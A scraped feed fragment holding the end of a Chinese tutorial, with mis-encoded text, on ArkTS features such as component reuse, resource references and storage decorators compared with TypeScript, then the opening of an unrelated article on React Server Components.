<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// @Reusableæ ‡è®°å¯å¤ç”¨ç»„ä»¶ï¼Œæå‡æ€§èƒ½</span>
<span class="hljs-meta">@Reusable</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ReusableListItem</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">item</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  
  <span class="hljs-comment">// ç»„ä»¶å³å°†è¢«å¤ç”¨æ—¶è°ƒç”¨</span>
  <span class="hljs-title function_">aboutToReuse</span>(<span class="hljs-params">params: Record&lt;<span class="hljs-built_in">string</span>, <span class="hljs-built_in">Object</span>&gt;</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">item</span> = params.<span class="hljs-property">item</span> <span class="hljs-keyword">as</span> <span class="hljs-built_in">string</span>;
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Row</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">item</span>)
        .<span class="hljs-title function_">fontSize</span>(<span class="hljs-number">16</span>)
    }
    .<span class="hljs-title function_">width</span>(<span class="hljs-string">'100%'</span>)
    .<span class="hljs-title function_">height</span>(<span class="hljs-number">50</span>)
    .<span class="hljs-title function_">padding</span>(<span class="hljs-number">10</span>)
  }
}

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ReusableListExample</span> {
  <span class="hljs-meta">@State</span> <span class="hljs-attr">items</span>: <span class="hljs-built_in">string</span>[] = <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>({ <span class="hljs-attr">length</span>: <span class="hljs-number">100</span> }, <span class="hljs-function">(<span class="hljs-params">_, i</span>) =&gt;</span> <span class="hljs-string">`Item <span class="hljs-subst">${i}</span>`</span>);
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">List</span>() {
      <span class="hljs-title class_">ForEach</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">items</span>, <span class="hljs-function">(<span class="hljs-params">item: <span class="hljs-built_in">string</span></span>) =&gt;</span> {
        <span class="hljs-title class_">ListItem</span>() {
          <span class="hljs-title class_">ReusableListItem</span>({ <span class="hljs-attr">item</span>: item })
        }
      })
    }
  }
}
</code></pre>
<h3 data-id="heading-64">13. èµ„æºå¼•ç”¨ç³»ç»Ÿ</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">ResourceExample</span> {
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-comment">// $rå¼•ç”¨èµ„æºæ–‡ä»¶</span>
      <span class="hljs-title class_">Text</span>($r(<span class="hljs-string">'app.string.hello'</span>))  <span class="hljs-comment">// å¼•ç”¨å­—ç¬¦ä¸²èµ„æº</span>
        .<span class="hljs-title function_">fontSize</span>($r(<span class="hljs-string">'app.float.title_font_size'</span>))  <span class="hljs-comment">// å¼•ç”¨æ•°å€¼èµ„æº</span>
        .<span class="hljs-title function_">fontColor</span>($r(<span class="hljs-string">'app.color.primary'</span>))  <span class="hljs-comment">// å¼•ç”¨é¢œè‰²èµ„æº</span>
      
      <span class="hljs-title class_">Image</span>($r(<span class="hljs-string">'app.media.icon'</span>))  <span class="hljs-comment">// å¼•ç”¨å›¾ç‰‡èµ„æº</span>
        .<span class="hljs-title function_">width</span>(<span class="hljs-number">100</span>)
        .<span class="hljs-title function_">height</span>(<span class="hljs-number">100</span>)
      
      <span class="hljs-comment">// $rawfileå¼•ç”¨rawfileç›®å½•ä¸‹çš„æ–‡ä»¶</span>
      <span class="hljs-title class_">Image</span>($rawfile(<span class="hljs-string">'background.png'</span>))
      
      <span class="hljs-comment">// ä½¿ç”¨èµ„æºçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²</span>
      <span class="hljs-title class_">Text</span>($r(<span class="hljs-string">'app.string.welcome_message'</span>, <span class="hljs-string">'Zhang San'</span>))
    }
  }
}
</code></pre>
<h3 data-id="heading-65">14. LocalStorage é¡µé¢çº§çŠ¶æ€ç®¡ç†</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åˆ›å»ºLocalStorageå®ä¾‹</span>
<span class="hljs-keyword">let</span> storage = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LocalStorage</span>({ <span class="hljs-string">'count'</span>: <span class="hljs-number">0</span> });

<span class="hljs-meta">@Entry</span>(storage)
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PageA</span> {
  <span class="hljs-comment">// @LocalStorageLinkåŒå‘ç»‘å®š</span>
  <span class="hljs-meta">@LocalStorageLink</span>(<span class="hljs-string">'count'</span>) <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>({ <span class="hljs-attr">space</span>: <span class="hljs-number">20</span> }) {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Count: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Increase'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">count</span>++;
        })
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Go to Page B'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          router.<span class="hljs-title function_">pushUrl</span>({ <span class="hljs-attr">url</span>: <span class="hljs-string">'pages/PageB'</span> });
        })
    }
  }
}

<span class="hljs-meta">@Entry</span>(storage)
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">PageB</span> {
  <span class="hljs-comment">// @LocalStoragePropå•å‘åŒæ­¥</span>
  <span class="hljs-meta">@LocalStorageProp</span>(<span class="hljs-string">'count'</span>) <span class="hljs-attr">count</span>: <span class="hljs-built_in">number</span> = <span class="hljs-number">0</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Count from Page A: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.count}</span>`</span>)
    }
  }
}
</code></pre>
<h3 data-id="heading-66">15. AppStorage åº”ç”¨çº§çŠ¶æ€ç®¡ç†</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// åˆå§‹åŒ–åº”ç”¨å…¨å±€çŠ¶æ€</span>
<span class="hljs-title class_">AppStorage</span>.<span class="hljs-title class_">SetOrCreate</span>(<span class="hljs-string">'userInfo'</span>, { <span class="hljs-attr">name</span>: <span class="hljs-string">'Guest'</span>, <span class="hljs-attr">isLoggedIn</span>: <span class="hljs-literal">false</span> });
<span class="hljs-title class_">AppStorage</span>.<span class="hljs-title class_">SetOrCreate</span>(<span class="hljs-string">'theme'</span>, <span class="hljs-string">'light'</span>);

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">HomePage</span> {
  <span class="hljs-comment">// @StorageLinkåŒå‘ç»‘å®šåº”ç”¨å…¨å±€çŠ¶æ€</span>
  <span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'userInfo'</span>) <span class="hljs-attr">userInfo</span>: <span class="hljs-built_in">object</span> = {};
  <span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'theme'</span>) <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'light'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`User: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.userInfo[<span class="hljs-string">'name'</span>]}</span>`</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Theme: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.theme}</span>`</span>)
      
      <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Toggle Theme'</span>)
        .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">theme</span> = <span class="hljs-variable language_">this</span>.<span class="hljs-property">theme</span> === <span class="hljs-string">'light'</span> ? <span class="hljs-string">'dark'</span> : <span class="hljs-string">'light'</span>;
        })
    }
  }
}

<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">SettingsPage</span> {
  <span class="hljs-comment">// @StoragePropå•å‘åŒæ­¥</span>
  <span class="hljs-meta">@StorageProp</span>(<span class="hljs-string">'theme'</span>) <span class="hljs-attr">theme</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'light'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Current Theme: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.theme}</span>`</span>)
    }
  }
}
</code></pre>
<h3 data-id="heading-67">16. PersistentStorage æŒä¹…åŒ–å­˜å‚¨</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// æŒä¹…åŒ–å­˜å‚¨ï¼Œåº”ç”¨é‡å¯åæ•°æ®ä»ç„¶å­˜åœ¨</span>
<span class="hljs-title class_">PersistentStorage</span>.<span class="hljs-title class_">PersistProp</span>(<span class="hljs-string">'token'</span>, <span class="hljs-string">''</span>);
<span class="hljs-title class_">PersistentStorage</span>.<span class="hljs-title class_">PersistProp</span>(<span class="hljs-string">'username'</span>, <span class="hljs-string">'Guest'</span>);

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">LoginPage</span> {
  <span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'token'</span>) <span class="hljs-attr">token</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  <span class="hljs-meta">@StorageLink</span>(<span class="hljs-string">'username'</span>) <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">''</span>;
  
  <span class="hljs-title function_">login</span>(<span class="hljs-params">username: <span class="hljs-built_in">string</span>, password: <span class="hljs-built_in">string</span></span>) {
    <span class="hljs-comment">// ç™»å½•é€»è¾‘</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span> = <span class="hljs-string">'generated_token'</span>;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">username</span> = username;
    <span class="hljs-comment">// æ•°æ®ä¼šè‡ªåŠ¨æŒä¹…åŒ–</span>
  }
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">token</span>) {
        <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Welcome, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.username}</span>`</span>)
      } <span class="hljs-keyword">else</span> {
        <span class="hljs-title class_">Button</span>(<span class="hljs-string">'Login'</span>)
          .<span class="hljs-title function_">onClick</span>(<span class="hljs-function">() =&gt;</span> {
            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">login</span>(<span class="hljs-string">'user123'</span>, <span class="hljs-string">'password'</span>);
          })
      }
    }
  }
}
</code></pre>
<h3 data-id="heading-68">17. Environment ç¯å¢ƒå˜é‡</h3>
<p><strong>ArkTSç‹¬æœ‰ï¼š</strong></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// ç›‘å¬ç³»ç»Ÿç¯å¢ƒå˜åŒ–</span>
<span class="hljs-title class_">Environment</span>.<span class="hljs-title class_">EnvProp</span>(<span class="hljs-string">'colorMode'</span>, <span class="hljs-title class_">ColorMode</span>.<span class="hljs-property">LIGHT</span>);
<span class="hljs-title class_">Environment</span>.<span class="hljs-title class_">EnvProp</span>(<span class="hljs-string">'languageCode'</span>, <span class="hljs-string">'zh'</span>);

<span class="hljs-meta">@Entry</span>
<span class="hljs-meta">@Component</span>
struct <span class="hljs-title class_">EnvironmentExample</span> {
  <span class="hljs-meta">@StorageProp</span>(<span class="hljs-string">'colorMode'</span>) <span class="hljs-attr">colorMode</span>: <span class="hljs-built_in">number</span> = <span class="hljs-title class_">ColorMode</span>.<span class="hljs-property">LIGHT</span>;
  <span class="hljs-meta">@StorageProp</span>(<span class="hljs-string">'languageCode'</span>) <span class="hljs-attr">language</span>: <span class="hljs-built_in">string</span> = <span class="hljs-string">'zh'</span>;
  
  <span class="hljs-title function_">build</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Column</span>() {
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Color Mode: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.colorMode === ColorMode.LIGHT ? <span class="hljs-string">'Light'</span> : <span class="hljs-string">'Dark'</span>}</span>`</span>)
      <span class="hljs-title class_">Text</span>(<span class="hljs-string">`Language: <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.language}</span>`</span>)
    }
    .<span class="hljs-title function_">backgroundColor</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">colorMode</span> === <span class="hljs-title class_">ColorMode</span>.<span class="hljs-property">LIGHT</span> ? <span class="hljs-title class_">Color</span>.<span class="hljs-property">White</span> : <span class="hljs-title class_">Color</span>.<span class="hljs-property">Black</span>)
  }
}
</code></pre>
<hr/>
<h2 data-id="heading-69">ArkTSä¸TypeScriptçš„ä¸»è¦åŒºåˆ«æ€»ç»“</h2>
<h3 data-id="heading-70">TypeScriptæ²¡æœ‰ä½†ArkTSæœ‰çš„æ ¸å¿ƒç‰¹æ€§ï¼š</h3>
<ol>
<li>
<p><strong>å£°æ˜å¼UIè£…é¥°å™¨ç³»ç»Ÿ</strong></p>
<ul>
<li><code>@Component</code>ã€<code>@Entry</code>ã€<code>@Preview</code> ç­‰ç»„ä»¶è£…é¥°å™¨</li>
<li>TypeScriptå®Œå…¨æ²¡æœ‰UIç»„ä»¶çš„æ¦‚å¿µ</li>
</ul>
</li>
<li>
<p><strong>å“åº”å¼çŠ¶æ€ç®¡ç†è£…é¥°å™¨</strong></p>
<ul>
<li><code>@State</code>ã€<code>@Prop</code>ã€<code>@Link</code>ã€<code>@Provide</code>ã€<code>@Consume</code></li>
<li><code>@ObjectLink</code>ã€<code>@Observed</code>ã€<code>@Watch</code></li>
<li>TypeScriptéœ€è¦å€ŸåŠ©ç¬¬ä¸‰æ–¹åº“ï¼ˆå¦‚MobXã€Reduxï¼‰</li>
</ul>
</li>
<li>
<p><strong>UIæ„å»ºä¸“ç”¨è¯­æ³•</strong></p>
<ul>
<li><code>struct</code> ç»“æ„ä½“å®šä¹‰ç»„ä»¶</li>
<li><code>build()</code> æ–¹æ³•å£°æ˜å¼æ„å»ºUI</li>
<li>é“¾å¼è°ƒç”¨è®¾ç½®å±æ€§</li>
<li>TypeScriptæ²¡æœ‰è¿™ç§å†…ç½®UIè¯­æ³•</li>
</ul>
</li>
<li>
<p><strong>å†…ç½®UIç»„ä»¶åº“</strong></p>
<ul>
<li>Columnã€Rowã€Stackã€Flexã€Gridç­‰å®¹å™¨ç»„ä»¶</li>
<li>Textã€Buttonã€Imageã€TextInputç­‰åŸºç¡€ç»„ä»¶</li>
<li>TypeScriptéœ€è¦ä¾èµ–ç¬¬ä¸‰æ–¹UIæ¡†æ¶</li>
</ul>
</li>
<li>
<p><strong>UIå¤ç”¨è£…é¥°å™¨</strong></p>
<ul>
<li><code>@Builder</code> è‡ªå®šä¹‰æ„å»ºå‡½æ•°</li>
<li><code>@Styles</code> æ ·å¼å¤ç”¨</li>
<li><code>@Extend</code> æ‰©å±•ç»„ä»¶</li>
<li><code>@CustomDialog</code> è‡ªå®šä¹‰å¼¹çª—</li>
<li>TypeScriptæ²¡æœ‰è¿™äº›UIå¤ç”¨æœºåˆ¶</li>
</ul>
</li>
<li>
<p><strong>æ¡ä»¶å’Œå¾ªç¯æ¸²æŸ“</strong></p>
<ul>
<li><code>ForEach</code>ã€<code>LazyForEach</code> ä¸“ç”¨å¾ªç¯è¯­æ³•</li>
<li>åœ¨buildæ–¹æ³•ä¸­ç›´æ¥ä½¿ç”¨if/else</li>
<li>TypeScriptéœ€è¦ä½¿ç”¨JSXæˆ–æ¨¡æ¿è¯­æ³•</li>
</ul>
</li>
<li>
<p><strong>çŠ¶æ€ç®¡ç†ç³»ç»Ÿ</strong></p>
<ul>
<li><code>LocalStorage</code> é¡µé¢çº§çŠ¶æ€</li>
<li><code>AppStorage</code> åº”ç”¨çº§çŠ¶æ€</li>
<li><code>PersistentStorage</code> æŒä¹…åŒ–å­˜å‚¨</li>
<li><code>Environment</code> ç¯å¢ƒå˜é‡</li>
<li>TypeScriptéœ€è¦ç¬¬ä¸‰æ–¹çŠ¶æ€ç®¡ç†åº“</li>
</ul>
</li>
<li>
<p><strong>èµ„æºç®¡ç†ç³»ç»Ÿ</strong></p>
<ul>
<li><code>$r()</code> èµ„æºå¼•ç”¨</li>
<li><code>$rawfile()</code> åŸå§‹æ–‡ä»¶å¼•ç”¨</li>
<li>TypeScriptæ²¡æœ‰ç»Ÿä¸€çš„èµ„æºç®¡ç†ç³»ç»Ÿ</li>
</ul>
</li>
<li>
<p><strong>å¹¶å‘å’Œæ€§èƒ½ä¼˜åŒ–</strong></p>
<ul>
<li><code>@Concurrent</code> å¹¶å‘è£…é¥°å™¨</li>
<li><code>@Reusable</code> ç»„ä»¶å¤ç”¨</li>
<li><code>@AnimatableExtend</code> åŠ¨ç”»æ‰©å±•</li>
<li>TypeScriptéœ€è¦æ‰‹åŠ¨ç®¡ç†</li>
</ul>
</li>
<li>
<p><strong>é¸¿è’™ç‰¹æœ‰API</strong></p>
<ul>
<li>åˆ†å¸ƒå¼èƒ½åŠ›API</li>
<li>ç³»ç»ŸæœåŠ¡API</li>
<li>è®¾å¤‡ååŒAPI</li>
</ul>
</li>
</ol>
<h3 data-id="heading-71">ArkTSé™åˆ¶çš„TypeScriptç‰¹æ€§ï¼š</h3>
<ol>
<li>
<p><strong>ç¦ç”¨æˆ–é™åˆ¶çš„ç‰¹æ€§</strong></p>
<ul>
<li>ä¸¥æ ¼é™åˆ¶<code>any</code>ç±»å‹ä½¿ç”¨</li>
<li>ç¦æ­¢åŸå‹é“¾æ“ä½œ</li>
<li>ç¦æ­¢<code>eval</code>å’Œ<code>Function</code>æ„é€ å™¨</li>
<li>ç¦æ­¢<code>with</code>è¯­å¥</li>
<li>é™åˆ¶åŠ¨æ€å±æ€§è®¿é—®</li>
</ul>
</li>
<li>
<p><strong>æ›´ä¸¥æ ¼çš„ç±»å‹è¦æ±‚</strong></p>
<ul>
<li>å¼ºåˆ¶ç±»å‹å£°æ˜</li>
<li>æ›´ä¸¥æ ¼çš„nullå®‰å…¨æ£€æŸ¥</li>
<li>æ›´ä¸¥æ ¼çš„ç±»å‹æ¨æ–­</li>
</ul>
</li>
</ol>
<p><strong>æ€»ç»“ï¼š</strong> ArkTSåœ¨TypeScriptåŸºç¡€ä¸Šï¼Œæ–°å¢äº†å®Œæ•´çš„å£°æ˜å¼UIå¼€å‘ä½“ç³»ã€å“åº”å¼çŠ¶æ€ç®¡ç†ç³»ç»Ÿã€å†…ç½®ç»„ä»¶åº“ç­‰å¤§é‡TypeScriptæ²¡æœ‰çš„ç‰¹æ€§ï¼ŒåŒæ—¶é™åˆ¶äº†ä¸€äº›åŠ¨æ€ç‰¹æ€§ä»¥æé«˜æ€§èƒ½å’Œç±»å‹å®‰å…¨ã€‚è¿™ä½¿å¾—ArkTSæˆä¸ºä¸“é—¨ä¸ºé¸¿è’™åº”ç”¨å¼€å‘è®¾è®¡çš„è¯­è¨€ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å‰ç«¯å®æµ‹ï¼šRSCä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒçœŸçš„é‡æ„äº†æˆ‘çš„æŠ€æœ¯æ ˆ]]></title>    <link>https://juejin.cn/post/7580745065170649139</link>    <guid>https://juejin.cn/post/7580745065170649139</guid>    <pubDate>2025-12-08T03:20:59.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7580745065170649139" data-draft-id="7580745065170616371" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å‰ç«¯å®æµ‹ï¼šRSCä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒçœŸçš„é‡æ„äº†æˆ‘çš„æŠ€æœ¯æ ˆ"/> <meta itemprop="keywords" content="å‰ç«¯,React.js"/> <meta itemprop="datePublished" content="2025-12-08T03:20:59.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å¥‹æ–—çŒ¿"/> <meta itemprop="url" content="https://juejin.cn/user/1702522294632830"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å‰ç«¯å®æµ‹ï¼šRSCä¸æ˜¯é“¶å¼¹ï¼Œä½†å®ƒçœŸçš„é‡æ„äº†æˆ‘çš„æŠ€æœ¯æ ˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1702522294632830/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å¥‹æ–—çŒ¿
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T03:20:59.000Z" title="Mon Dec 08 2025 03:20:59 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»3åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2025å¹´çš„å‰ç«¯åœˆï¼ŒReact Server Componentsï¼ˆRSCï¼‰ä¸å†æ˜¯â€œæ¦‚å¿µè¯â€â€”â€”Next.js 14å°†å…¶è®¾ä¸ºé»˜è®¤æ¨¡å¼ï¼ŒVercelçš„ç”Ÿäº§ç¯å¢ƒæ•°æ®æ˜¾ç¤ºï¼Œé‡‡ç”¨RSCçš„é¡¹ç›®é¦–å±åŠ è½½é€Ÿåº¦å¹³å‡æå‡42%ã€‚ä½œä¸ºåˆšç”¨RSCé‡æ„å®Œä¸­åå°ç³»ç»Ÿçš„å‰ç«¯ï¼Œæˆ‘æƒ³è¯´ï¼šå®ƒä¸æ˜¯ç”¨æ¥æ›¿ä»£SSRçš„â€œæ–°ç©å…·â€ï¼Œè€Œæ˜¯é‡æ–°å®šä¹‰â€œå‰åç«¯è¾¹ç•Œâ€çš„æ ¸å¿ƒæ–¹æ¡ˆã€‚</p>
